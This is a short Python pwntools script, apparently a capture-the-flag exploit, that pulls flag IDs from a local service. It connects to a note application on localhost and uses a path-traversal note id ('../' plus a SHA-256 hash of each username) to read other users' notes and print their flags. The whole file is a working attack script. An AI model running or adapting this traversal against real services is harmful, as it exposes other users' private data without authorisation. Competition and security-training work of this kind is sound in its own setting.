from pwn import*
import requests
import json
from hashlib import sha256 

port = 1235
ip_addr = "localhost"

flagIdsIP = "http://localhost:8081"


x = requests.get(flagIdsIP).text
jsons = json.loads(x)

usernames = []

for j in jsons:
    usernames.append(j["flagId"])
    

io = remote(ip_addr, port)

io.recvuntil(b"username: ")
io.sendline(b"ciao")
flags = []
for u in usernames:
    io.recvuntil(b"0. Exit")
    io.sendline(b"3")

    io.recvuntil(b"Enter your note id: ")
    io.sendline("../" + sha256(u.encode()).hexdigest() + "/0")
    io.recvline()
    flag = io.recvline().decode().strip().split(" ")[1]
    print(flag)
    flags.append(flag)

print(flags)
